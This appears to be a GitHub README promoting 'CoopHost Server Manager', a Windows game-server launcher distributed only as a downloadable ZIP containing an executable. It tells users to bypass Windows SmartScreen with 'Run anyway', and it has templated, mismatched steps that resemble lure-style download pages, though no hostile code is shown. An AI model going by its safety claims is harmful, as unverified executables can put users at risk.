<p align="center">
  <img src="https://i.postimg.cc/zvDhqF8T/banner.png" alt="CoopHost Server Manager — 1-Click Dedicated Game Server Launcher & Backup GUI" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Dedicated%20Server%20GUI-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-coophost--v1.3-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# CoopHost Server Manager — 1-Click Dedicated Game Server Launcher & Backup GUI

**Tired of paying $20/month for laggy server hosting or editing .bat launch scripts, server.properties, and router port rules manually? Host your own Minecraft, Palworld, Enshrouded, Valheim, or Terraria dedicated server on Windows in one clean dashboard.**

CoopHost Server Manager turns Windows dedicated server hosting into a visual control panel: **configuring RAM allocation sliders, editing server settings without syntax errors, attempting automatic UPnP router port mapping, and zipping scheduled world backups while players are online**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC gamers** hosting private co-op servers for friends on their own hardware.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Friends get 'Connection Timed Out' when joining your server | Router ports (`25565`, `8211`, `2456`, `15636`) or Windows Firewall blocked | Click **UPnP Auto-Forward & Add Firewall Rule** and verify public IP |
| Minecraft or Palworld server lags from low default heap RAM | Default `.bat` launcher allocates only `1 GB–2 GB` RAM | Drag the **RAM Allocation Slider** (`4 GB` / `8 GB` / `12 GB`) cleanly |
| Server crash or griefing wipes days of base building | No automated rolling backups while server is running | Enable **Hourly Rolling World Backups** (`Keep Last 10 ZIPs`) |
| Editing `PalWorldSettings.ini` or `server.properties` breaks syntax | Single-line INI strings or typos reset server configs | Use structured key-value settings tabs with automatic `.bak` backup |

## Download for Windows

[**Download CoopHost.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/CoopHost.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `CoopHost.exe`? (Key features)

- Supports **Minecraft (Vanilla/Paper/Forge/Fabric)**, **Palworld**, **Enshrouded**, **Valheim**, **Terraria**, and custom `.exe`/`.jar` servers.
- Visual **RAM Allocation Slider**, **Auto-Restart on Crash**, and live **Console / RCON** command box.
- Built-in **UPnP Port Mapper** + Windows Defender Firewall rule helper + Public Join IP copy button.
- Automated **Scheduled World Backups** (`.zip`) with retention limits and 1-click world restore.

### Sample Output

```text
[CoopHost] Instance: Palworld_Friends_2026 (Port: UDP 8211 | RAM: 8.0 GB)
[OK]   Firewall & UPnP  : UDP 8211 mapped on gateway 192.168.1.1 -> Public IP Copied!
[OK]   Server Status    : ONLINE (Tick: 60 Hz | Memory: 4.6 GB / 8.0 GB | Players: 3/8)
[OK]   Auto-Backup      : World backed up to Backups\Palworld_2026-11-23_18-00.zip
```

The release ZIP is named `CoopHost.zip`; the Windows executable inside is named `CoopHost.exe`.

1. Close CoopHost before updating or replacing executable files.
2. Click **Download CoopHost.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `CoopHost.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit), 16 GB+ RAM recommended when running both a dedicated server and game client on the same PC.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `CoopHost.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Zero `.bat` script or JVM garbage-collection flag headaches

Applies optimized memory flags automatically from a simple slider.

### One-click UPnP port forwarding & firewall setup

Eliminates the #1 hurdle preventing friends from joining self-hosted servers.

### Automatic crash recovery & scheduled backups

Restarts crashed servers automatically and protects worlds with hourly `.zip` snapshots.

### Monitor CPU, RAM, and player count in one window

Clean console log with quick `save` / `broadcast` / `kick` commands.

## Default folders and configuration paths

CoopHost organizes server profiles and rolling world backups in `%USERPROFILE%\CoopHostServers`:

```text
%USERPROFILE%\CoopHostServers\
```

Typical directory layout:

```text
%USERPROFILE%\CoopHostServers\
├── instances.json
└── Palworld_Main\
    ├── ServerFiles\
    └── Backups\
        └── World_2026-11-23_18-00.zip
```

If your ISP uses Carrier-Grade NAT (CGNAT), UPnP cannot open public ports—use a mesh LAN tool (Tailscale / ZeroTier) with friends instead.

## Quick start guide

Follow these steps to get started:

1. **Extract `CoopHost.zip` to a local folder on an NVMe SSD and launch `CoopHost.exe`.** Click **+ New Server Instance** and select your game template or existing server `.exe`/`.jar`.
2. **Set your **RAM Limit**, **Server Name**, **Password**, and **Port**.** Click **Configure Firewall & UPnP**.
3. **Enable **Hourly World Backups** and **Auto-Restart on Crash**.** Click **Start Server** and copy your Join IP:Port to share with friends.

### Data safety note

Always stop the server gracefully (`save` + `stop`) before restoring a backup `.zip`.

## What the status summary shows

CoopHost displays **server online status, RAM usage, UPnP port mapping result, active player count, and last backup timestamp**.

## FAQ

**Does CoopHost download copyrighted game files?**

No—it manages official free dedicated server binaries (such as SteamCMD dedicated servers or official Minecraft server `.jar` files) that you point it to.

**What if my router has UPnP disabled?**

You can enable UPnP in your router admin page or forward the single UDP/TCP port shown in CoopHost manually.

**Can I run the server and play on the same PC?**

Yes—just leave at least 8 GB of system RAM free for your game client.

## Useful reading

- [Valve Developer Community — SteamCMD Dedicated Servers](https://developer.valvesoftware.com/wiki/SteamCMD)

## More Windows Desktop Utilities

- [PortWatch-LocalPortKiller](../PortWatch-LocalPortKiller) — Find & free blocked Windows TCP/UDP ports in one click
- [CloudSave-UniversalGameSync](../CloudSave-UniversalGameSync) — Automatic save folder synchronizer for non-Steam Cloud games
- [ModDrop-UniversalPakInstaller](../ModDrop-UniversalPakInstaller) — Drag-and-drop ZIP/PAK mod installer with conflict check
- [WakeLock-KeepAwakeTray](../WakeLock-KeepAwakeTray) — Keep Windows awake while hosting co-op servers & downloads

*Independent open-source desktop utility for Windows. Not affiliated with Mojang, Pocketpair, Iron Gate, Keen Games, or Valve.*
